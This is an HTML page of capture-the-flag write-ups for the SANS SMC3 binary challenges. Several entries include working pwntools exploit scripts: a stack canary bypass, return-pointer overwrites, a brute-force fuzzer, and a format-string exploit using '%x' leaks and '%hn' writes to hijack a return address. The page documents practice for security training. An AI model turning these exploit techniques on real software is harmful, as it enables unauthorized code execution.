<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

      <title>CTF Writeups</title>

      
      

      <!-- CSS -->
      
      <link rel="stylesheet" href="http://127.0.0.1:1111/style.css">
      

      
      
    </head>

    <body>
        <div class="menu">
            
            
            <nav role="navigation">
                <ul>
                    
                        
                        
                            
                            <li >
                                
                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;auctf-2020&#x2F;">
                                    
                                    AUCTF 2020
                                </a>
                                
                                    <ul>
                                        
                                            <li >
                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;auctf-2020&#x2F;reversing&#x2F;">
                                                    
                                                    Reversing
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                        
                            
                            <li >
                                
                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;">
                                    
                                    SANS SMC3
                                </a>
                                
                                    <ul>
                                        
                                            <li class="active">
                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;binary&#x2F;">
                                                    
                                                    Binary
                                                </a>
                                            </li>
                                        
                                            <li >
                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;crypto&#x2F;">
                                                    
                                                    Crypto
                                                </a>
                                            </li>
                                        
                                            <li >
                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;web&#x2F;">
                                                    
                                                    Web
                                                </a>
                                            </li>
                                        
                                            <li >
                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;forensics&#x2F;">
                                                    
                                                    Forensics
                                                </a>
                                            </li>
                                        
                                            <li >
                                                <a href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;network&#x2F;">
                                                    
                                                    Network
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                        
                    
                </ul>
            </nav>
            
            
        </div>

        <div class="page">
            <div class="page__header">
                <div class="menu-icon">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
                
                <span class="search-icon">ðŸ”Ž</span>
                
            </div>

            <div class="page__content">
                
                <div class="search-container">
                    <input id="search" type="search" placeholder="Search..">
                    <div class="search-results">
                        <div class="search-results__header"></div>
                        <ul class="search-results__items"></ul>
                    </div>
                </div>
                
                <div class="book-content">
                    
    <h1>Binary</h1>
    <h2 id="be01">be01<a class="zola-anchor" href="#be01" aria-label="Anchor link for: be01">ðŸ”—</a></h2>
<p>The flag was stored inside the binary and could be retrieved with strings</p>
<p><code>strings be01 | grep Flag</code></p>
<p>flag: <code>sTriNGS-r-EZ-7819</code></p>
<h2 id="be02">be02<a class="zola-anchor" href="#be02" aria-label="Anchor link for: be02">ðŸ”—</a></h2>
<p>the provided source code printed out the flag when executed</p>
<p><code>gcc be02.c; ./a.out</code></p>
<p>flag: <code>c0mpILE-tIME_1822</code></p>
<h2 id="bm01">bm01<a class="zola-anchor" href="#bm01" aria-label="Anchor link for: bm01">ðŸ”—</a></h2>
<p>the flag checks if one character in your input is b and if it is it will give you the flag</p>
<p><code>python -c &quot;print('b' * 79)&quot; | nc ggcs-bm01.allyourbases.co 8134</code></p>
<p>flag: <code>c0MinG-Up_bs-8788</code></p>
<h2 id="bh02">bh02<a class="zola-anchor" href="#bh02" aria-label="Anchor link for: bh02">ðŸ”—</a></h2>
<p>simple constant stack canary.  The canary was <code>:)</code> and the loop terminated if the byte after it was <code>f</code></p>
<pre style="background-color:#272822;">
<code><span style="color:#f92672;">from </span><span style="color:#f8f8f2;">pwn </span><span style="color:#f92672;">import </span><span style="color:#ae81ff;">*

</span><span style="color:#f8f8f2;">context.terminal </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">[</span><span style="color:#e6db74;">&#39;termite&#39;</span><span style="color:#f8f8f2;">, </span><span style="color:#e6db74;">&#39;-e&#39;</span><span style="color:#f8f8f2;">]


</span><span style="color:#75715e;"># p = process(&#39;./bh02&#39;)
# p = gdb.debug(&quot;./bh02&quot;)
</span><span style="color:#f8f8f2;">p </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">remote(</span><span style="color:#e6db74;">&#39;ggcs-bh02.allyourbases.co&#39;</span><span style="color:#f8f8f2;">, </span><span style="color:#ae81ff;">8133</span><span style="color:#f8f8f2;">)


buf_length </span><span style="color:#f92672;">= </span><span style="color:#ae81ff;">0x50

</span><span style="color:#f8f8f2;">payload </span><span style="color:#f92672;">= </span><span style="font-style:italic;color:#66d9ef;">b</span><span style="color:#e6db74;">&#39;f&#39; </span><span style="color:#f92672;">* </span><span style="color:#ae81ff;">0x32 </span><span style="color:#f92672;">+ </span><span style="font-style:italic;color:#66d9ef;">b</span><span style="color:#e6db74;">&#39;:)f&#39;

</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(p.recvuntil(</span><span style="color:#e6db74;">&quot;:&quot;</span><span style="color:#f8f8f2;">))

p.sendline(payload)

p.interactive()
</span></code></pre>
<p>flag: <code>caNaRY-CoalMINE-2811</code></p>
<h2 id="bh03">bh03<a class="zola-anchor" href="#bh03" aria-label="Anchor link for: bh03">ðŸ”—</a></h2>
<p>we don't have a binary for this one. The server it tells us to connect to gives us three functions to return to and then tells us the return pointer before exiting.  I used cyclic to determine that the correct offset was 45 and then wrote a python script to read the addresses in and overwrite the return pointers correctly.  After successfully returning to all three functions it gives us this text. </p>
<pre style="background-color:#272822;">
<code><span style="color:#f92672;">from </span><span style="color:#f8f8f2;">pwn </span><span style="color:#f92672;">import </span><span style="color:#ae81ff;">*

</span><span style="color:#f8f8f2;">p </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">remote(</span><span style="color:#e6db74;">&quot;ggcs-bh03.allyourbases.co&quot;</span><span style="color:#f8f8f2;">, </span><span style="color:#ae81ff;">1337</span><span style="color:#f8f8f2;">)

</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(p.recvuntil(</span><span style="color:#e6db74;">&quot;: &quot;</span><span style="color:#f8f8f2;">))
three </span><span style="color:#f92672;">= </span><span style="font-style:italic;color:#66d9ef;">int</span><span style="color:#f8f8f2;">(p.recvuntil(</span><span style="color:#e6db74;">&quot;</span><span style="color:#ae81ff;">\n</span><span style="color:#e6db74;">&quot;</span><span style="color:#f8f8f2;">),</span><span style="color:#ae81ff;">16</span><span style="color:#f8f8f2;">)
</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(</span><span style="color:#e6db74;">&quot;function three: &quot;</span><span style="color:#f8f8f2;">, </span><span style="color:#66d9ef;">hex</span><span style="color:#f8f8f2;">(three))

</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(p.recvuntil(</span><span style="color:#e6db74;">&quot;: &quot;</span><span style="color:#f8f8f2;">))
two </span><span style="color:#f92672;">= </span><span style="font-style:italic;color:#66d9ef;">int</span><span style="color:#f8f8f2;">(p.recvuntil(</span><span style="color:#e6db74;">&quot;</span><span style="color:#ae81ff;">\n</span><span style="color:#e6db74;">&quot;</span><span style="color:#f8f8f2;">),</span><span style="color:#ae81ff;">16</span><span style="color:#f8f8f2;">)
</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(</span><span style="color:#e6db74;">&quot;function two: &quot;</span><span style="color:#f8f8f2;">, </span><span style="color:#66d9ef;">hex</span><span style="color:#f8f8f2;">(two))

</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(p.recvuntil(</span><span style="color:#e6db74;">&quot;: &quot;</span><span style="color:#f8f8f2;">))
one </span><span style="color:#f92672;">= </span><span style="font-style:italic;color:#66d9ef;">int</span><span style="color:#f8f8f2;">(p.recvuntil(</span><span style="color:#e6db74;">&quot;</span><span style="color:#ae81ff;">\n</span><span style="color:#e6db74;">&quot;</span><span style="color:#f8f8f2;">),</span><span style="color:#ae81ff;">16</span><span style="color:#f8f8f2;">)
</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(</span><span style="color:#e6db74;">&quot;function one: &quot;</span><span style="color:#f8f8f2;">, </span><span style="color:#66d9ef;">hex</span><span style="color:#f8f8f2;">(one))

</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(p.recvuntil(</span><span style="color:#e6db74;">&quot;you?&quot;</span><span style="color:#f8f8f2;">))

payload </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">cyclic(</span><span style="color:#ae81ff;">49</span><span style="color:#f92672;">-</span><span style="color:#ae81ff;">4</span><span style="color:#f8f8f2;">) </span><span style="color:#f92672;">+ </span><span style="color:#f8f8f2;">p32(three) </span><span style="color:#f92672;">+ </span><span style="color:#f8f8f2;">p32(two) </span><span style="color:#f92672;">+ </span><span style="color:#f8f8f2;">p32(one) </span><span style="color:#f92672;">+ </span><span style="color:#f8f8f2;">p32(three)

p.sendline(payload)

p.interactive()
</span></code></pre>
<p><code>RmxhZzogUmV UVE9mdW5jVGl PTi0xOTkw</code></p>
<p>I tried rot13 once and then stuck it into cyberchef and played around with it.  It ended up being base64</p>
<p>flag: <code>ReTTOfuncTiON-1990</code></p>
<h2 id="bx01">bx01<a class="zola-anchor" href="#bx01" aria-label="Anchor link for: bx01">ðŸ”—</a></h2>
<p>what the fuck</p>
<p><code>111111111111111111111111111%n</code>
made it print out
<code>Object validated, contents is 'Right now I would be number 1'</code></p>
<p>???</p>
<pre style="background-color:#272822;">
<code><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">itertools
</span><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">string
</span><span style="color:#f92672;">from </span><span style="color:#f8f8f2;">multiprocessing </span><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">Pool
</span><span style="color:#f92672;">from </span><span style="color:#f8f8f2;">pwn </span><span style="color:#f92672;">import </span><span style="color:#ae81ff;">*
</span><span style="color:#f92672;">import </span><span style="color:#f8f8f2;">tqdm

</span><span style="font-style:italic;color:#f92672;">def </span><span style="color:#a6e22e;">check</span><span style="color:#f8f8f2;">(</span><span style="font-style:italic;color:#fd971f;">i</span><span style="color:#f8f8f2;">):
    p </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">remote(</span><span style="color:#e6db74;">&#39;ggcs-bx01.allyourbases.co&#39;</span><span style="color:#f8f8f2;">, </span><span style="color:#ae81ff;">9171</span><span style="color:#f8f8f2;">)
    p.recvuntil(</span><span style="color:#e6db74;">&quot;&gt; &quot;</span><span style="color:#f8f8f2;">)
    p.sendline(</span><span style="color:#e6db74;">&#39;&#39;</span><span style="color:#f8f8f2;">.join(i))
    res </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">p.recvline()
    </span><span style="color:#f92672;">if </span><span style="font-style:italic;color:#66d9ef;">b</span><span style="color:#e6db74;">&#39;Invalid&#39; </span><span style="color:#f92672;">not in </span><span style="color:#f8f8f2;">res:
        </span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(</span><span style="color:#e6db74;">&quot;with: &quot;</span><span style="color:#f8f8f2;">, i)
        </span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(</span><span style="color:#e6db74;">&quot;result: &quot;</span><span style="color:#f8f8f2;">, res)


tasks </span><span style="color:#f92672;">= </span><span style="font-style:italic;color:#66d9ef;">list</span><span style="color:#f8f8f2;">(itertools.combinations(string.printable,</span><span style="color:#ae81ff;">2</span><span style="color:#f8f8f2;">))

pool </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">Pool(</span><span style="font-style:italic;color:#fd971f;">processes</span><span style="color:#f92672;">=</span><span style="color:#ae81ff;">8</span><span style="color:#f8f8f2;">)
</span><span style="color:#f92672;">for </span><span style="color:#f8f8f2;">_ </span><span style="color:#f92672;">in </span><span style="color:#f8f8f2;">tqdm.tqdm(pool.imap_unordered(check, tasks), </span><span style="font-style:italic;color:#fd971f;">total</span><span style="color:#f92672;">=</span><span style="color:#66d9ef;">len</span><span style="color:#f8f8f2;">(tasks)):
    </span><span style="color:#f92672;">pass
</span></code></pre>
<p>i used this script to check every printable 2 char combination to find vulnerabilities.</p>
<p>flag: <code>tRUNkated-EveRYTHinG-6761</code></p>
<h2 id="bm03">bm03<a class="zola-anchor" href="#bm03" aria-label="Anchor link for: bm03">ðŸ”—</a></h2>
<p>this exploit centered around a printf vulnerability which could be found in the transaction dialog.  After a valid transaction it would print out the user name directly through through printf and as such was vulnerable to a string format exploit.</p>
<p>My exploit was in two parts - one to leak the stack address and program base and one to take advantage of the %n string formatter to write the address of the read_flag function to the saved return pointer. </p>
<p>my first payload was <code>%x.%364$x</code> which leaked the address of a variable on the stack and a pointer to something in the program code.  I determined the offsets from the base and used these values to find the location of EBP in the account menu function and the program base.</p>
<p>I then used a payload like <code>%{address of read_flag}x%333$hn</code> to overwrite the return pointer.  the 333rd &quot;argument&quot; pointer to the first four bytes of the reference argument so I sent the address of the return pointer as the reference argument.  The goal was to pad out the left with a bunch of spaces matching the address of read_flag.  This value would then be written to the return pointer, allowing me to read the flag.</p>
<p>Once the return pointer was overwritten I just had to return and it would load read_flag.</p>
<p>The server wasn't running aslr so my address leaking exploit ended up being useless.  Good thing because the server was slow and I couldn't manage to leak address and then get the flag in the same session.</p>
<pre style="background-color:#272822;">
<code><span style="color:#f92672;">from </span><span style="color:#f8f8f2;">pwn </span><span style="color:#f92672;">import </span><span style="color:#ae81ff;">*

</span><span style="color:#f8f8f2;">context.terminal </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">[</span><span style="color:#e6db74;">&#39;termite&#39;</span><span style="color:#f8f8f2;">, </span><span style="color:#e6db74;">&#39;-e&#39;</span><span style="color:#f8f8f2;">]

account_id_counter </span><span style="color:#f92672;">= </span><span style="color:#ae81ff;">0

</span><span style="font-style:italic;color:#f92672;">def </span><span style="color:#a6e22e;">recv_input</span><span style="color:#f8f8f2;">():
	x </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">p.recvuntil(</span><span style="color:#e6db74;">&quot;:&gt;&quot;</span><span style="color:#f8f8f2;">)
	</span><span style="color:#75715e;"># print(x)

</span><span style="color:#f8f8f2;">p </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">process(</span><span style="color:#e6db74;">&#39;./bm03&#39;</span><span style="color:#f8f8f2;">, </span><span style="font-style:italic;color:#fd971f;">env </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">{</span><span style="color:#e6db74;">&quot;TERM&quot;</span><span style="color:#f8f8f2;">: </span><span style="color:#e6db74;">&quot;xterm-256color&quot;</span><span style="color:#f8f8f2;">, </span><span style="color:#e6db74;">&quot;SHELL&quot;</span><span style="color:#f8f8f2;">: </span><span style="color:#e6db74;">&quot;/usr/bin/zsh&quot;</span><span style="color:#f8f8f2;">})
</span><span style="color:#75715e;"># p = remote(&#39;bm03.allyourbases.co&#39;, 9010)
# p = gdb.debug(&#39;./bm03&#39;, env = {&quot;TERM&quot;: &quot;xterm-256color&quot;, &quot;SHELL&quot;: &quot;/usr/bin/zsh&quot;})

</span><span style="color:#f8f8f2;">e </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">ELF(</span><span style="color:#e6db74;">&#39;./bm03&#39;</span><span style="color:#f8f8f2;">)

recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;2&#39;</span><span style="color:#f8f8f2;">)
recv_input()

</span><span style="color:#75715e;"># creating user to leak esp

</span><span style="color:#f8f8f2;">p.sendline(</span><span style="color:#e6db74;">&#39;</span><span style="color:#ae81ff;">%x</span><span style="color:#e6db74;">.%</span><span style="color:#ae81ff;">{}</span><span style="color:#e6db74;">$x&#39;</span><span style="color:#f8f8f2;">.format(</span><span style="color:#ae81ff;">91</span><span style="color:#f92672;">*</span><span style="color:#ae81ff;">4</span><span style="color:#f8f8f2;">)) </span><span style="color:#75715e;"># 91*4 is stack offset to something in program memory 
</span><span style="color:#f8f8f2;">recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()


</span><span style="color:#75715e;"># log in
</span><span style="color:#f8f8f2;">p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()

</span><span style="color:#75715e;"># create account 1

</span><span style="color:#f8f8f2;">p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()

</span><span style="color:#75715e;"># create account 2

</span><span style="color:#f8f8f2;">p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()

p.sendline(</span><span style="color:#e6db74;">&#39;a&#39;</span><span style="color:#f8f8f2;">)

</span><span style="color:#75715e;"># make transaction

</span><span style="color:#f8f8f2;">p.sendline(</span><span style="color:#e6db74;">&#39;2&#39;</span><span style="color:#f8f8f2;">)
recv_input()

p.sendline(</span><span style="font-style:italic;color:#66d9ef;">str</span><span style="color:#f8f8f2;">(account_id_counter))
account_id_counter </span><span style="color:#f92672;">+= </span><span style="color:#ae81ff;">1
</span><span style="color:#f8f8f2;">recv_input()
p.sendline(</span><span style="font-style:italic;color:#66d9ef;">str</span><span style="color:#f8f8f2;">(account_id_counter))
account_id_counter </span><span style="color:#f92672;">+= </span><span style="color:#ae81ff;">1
</span><span style="color:#f8f8f2;">recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()

p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
p.recvuntil(</span><span style="color:#e6db74;">&#39;</span><span style="color:#ae81ff;">\&#39;</span><span style="color:#e6db74;">&#39;</span><span style="color:#f8f8f2;">)
addrs </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">p.recvuntil(</span><span style="color:#e6db74;">&#39;</span><span style="color:#ae81ff;">\&#39;</span><span style="color:#e6db74;">&#39;</span><span style="color:#f8f8f2;">)[:</span><span style="color:#f92672;">-</span><span style="color:#ae81ff;">1</span><span style="color:#f8f8f2;">]
addrs </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">[</span><span style="font-style:italic;color:#66d9ef;">int</span><span style="color:#f8f8f2;">(x,</span><span style="color:#ae81ff;">16</span><span style="color:#f8f8f2;">) </span><span style="color:#f92672;">for </span><span style="color:#f8f8f2;">x </span><span style="color:#f92672;">in </span><span style="color:#f8f8f2;">addrs.split(</span><span style="font-style:italic;color:#66d9ef;">b</span><span style="color:#e6db74;">&#39;.&#39;</span><span style="color:#f8f8f2;">) </span><span style="color:#f92672;">if </span><span style="color:#f8f8f2;">x </span><span style="color:#f92672;">not in </span><span style="font-style:italic;color:#66d9ef;">b</span><span style="color:#e6db74;">&#39;&#39;</span><span style="color:#f8f8f2;">]

p.sendline(</span><span style="color:#e6db74;">&quot;&quot;</span><span style="color:#f8f8f2;">)
recv_input()


p.sendline(</span><span style="color:#e6db74;">&quot;&quot;</span><span style="color:#f8f8f2;">)
p.sendline(</span><span style="color:#e6db74;">&quot;0&quot;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&quot;31337&quot;</span><span style="color:#f8f8f2;">)
recv_input()


ebp </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">addrs[</span><span style="color:#ae81ff;">0</span><span style="color:#f8f8f2;">] </span><span style="color:#f92672;">+ </span><span style="color:#ae81ff;">0x1b4
</span><span style="color:#75715e;"># ebp = 0xffffdb18
</span><span style="color:#f8f8f2;">program_base </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">addrs[</span><span style="color:#ae81ff;">1</span><span style="color:#f8f8f2;">] </span><span style="color:#f92672;">- </span><span style="color:#ae81ff;">0xb203
</span><span style="color:#75715e;"># program_base = 0x56555000
</span><span style="color:#f8f8f2;">saved_eip </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">ebp </span><span style="color:#f92672;">+ </span><span style="color:#ae81ff;">4
</span><span style="color:#f8f8f2;">read_flag </span><span style="color:#f92672;">= </span><span style="color:#f8f8f2;">program_base </span><span style="color:#f92672;">+ </span><span style="color:#f8f8f2;">e.symbols[</span><span style="color:#e6db74;">&#39;_Z9read_flagv&#39;</span><span style="color:#f8f8f2;">]
</span><span style="color:#75715e;"># print([hex(x) for x in addrs])
</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(</span><span style="color:#e6db74;">&quot;ebp: &quot;</span><span style="color:#f8f8f2;">, </span><span style="color:#66d9ef;">hex</span><span style="color:#f8f8f2;">(ebp) )
</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(</span><span style="color:#e6db74;">&quot;program_base: &quot;</span><span style="color:#f8f8f2;">, </span><span style="color:#66d9ef;">hex</span><span style="color:#f8f8f2;">(program_base))
</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(</span><span style="color:#e6db74;">&quot;read_flag: &quot;</span><span style="color:#f8f8f2;">, </span><span style="color:#66d9ef;">hex</span><span style="color:#f8f8f2;">(read_flag </span><span style="color:#f92672;">&amp; </span><span style="color:#ae81ff;">0xfff</span><span style="color:#f8f8f2;">))

</span><span style="color:#75715e;"># writing time

</span><span style="color:#f8f8f2;">p.sendline(</span><span style="color:#e6db74;">&#39;2&#39;</span><span style="color:#f8f8f2;">)
recv_input()

</span><span style="color:#75715e;"># creating user to leak esp

</span><span style="color:#f8f8f2;">base </span><span style="color:#f92672;">= </span><span style="color:#e6db74;">&#39;%</span><span style="color:#ae81ff;">{}</span><span style="color:#e6db74;">$hn&#39;</span><span style="color:#f8f8f2;">.format(</span><span style="color:#ae81ff;">333</span><span style="color:#f8f8f2;">)

pad </span><span style="color:#f92672;">= </span><span style="color:#e6db74;">&quot;%</span><span style="color:#ae81ff;">{}</span><span style="color:#e6db74;">x&quot;</span><span style="color:#f8f8f2;">.format((read_flag </span><span style="color:#f92672;">&amp; </span><span style="color:#ae81ff;">0xffff</span><span style="color:#f8f8f2;">) </span><span style="color:#f92672;">- </span><span style="color:#ae81ff;">0x15</span><span style="color:#f8f8f2;">)
p.sendline(pad </span><span style="color:#f92672;">+ </span><span style="color:#f8f8f2;">base)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;2&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;2&#39;</span><span style="color:#f8f8f2;">)
recv_input()


</span><span style="color:#75715e;"># log in
</span><span style="color:#f8f8f2;">p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;2&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;2&#39;</span><span style="color:#f8f8f2;">)
recv_input()

</span><span style="color:#75715e;"># create account 1

</span><span style="color:#f8f8f2;">p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()

</span><span style="color:#75715e;"># create account 2

</span><span style="color:#f8f8f2;">p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;1&#39;</span><span style="color:#f8f8f2;">)
recv_input()

p.sendline(</span><span style="color:#e6db74;">&#39;a&#39;</span><span style="color:#f8f8f2;">)

</span><span style="color:#75715e;"># make transaction

</span><span style="color:#f8f8f2;">p.sendline(</span><span style="color:#e6db74;">&#39;2&#39;</span><span style="color:#f8f8f2;">)
recv_input()

p.sendline(</span><span style="font-style:italic;color:#66d9ef;">str</span><span style="color:#f8f8f2;">(account_id_counter))
account_id_counter </span><span style="color:#f92672;">+= </span><span style="color:#ae81ff;">1
</span><span style="color:#f8f8f2;">recv_input()
p.sendline(</span><span style="font-style:italic;color:#66d9ef;">str</span><span style="color:#f8f8f2;">(account_id_counter))
account_id_counter </span><span style="color:#f92672;">+= </span><span style="color:#ae81ff;">1
</span><span style="color:#f8f8f2;">recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;0&#39;</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(p32(saved_eip) </span><span style="color:#f92672;">* </span><span style="color:#ae81ff;">49</span><span style="color:#f8f8f2;">)
recv_input()
p.sendline(</span><span style="color:#e6db74;">&#39;&#39;</span><span style="color:#f8f8f2;">)
recv_input()

p.sendline(</span><span style="color:#e6db74;">&#39;0&#39;</span><span style="color:#f8f8f2;">)

</span><span style="color:#66d9ef;">print</span><span style="color:#f8f8f2;">(p.recvall())
</span></code></pre>
<p>flag: <code>FormattingMatters</code></p>


                </div>
            </div>

            <div class="prev-link">
                
    
        
        
        <a class="previous" href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;"><</a>
    

            </div>

            <div class="next-link">
                
    
        <a class="next" href="http:&#x2F;&#x2F;127.0.0.1:1111&#x2F;smc3&#x2F;crypto&#x2F;">></a>
    

            </div>
        </div>

        
            
            <script type="text/javascript" src="http://127.0.0.1:1111/elasticlunr.min.js"></script>
            <script type="text/javascript" src="http://127.0.0.1:1111/search_index.en.js"></script>
            
            <script type="text/javascript" src="http://127.0.0.1:1111/book.js"></script>
        
    <script src="/livereload.js?port=1024&amp;mindelay=10"></script></body>

</html>
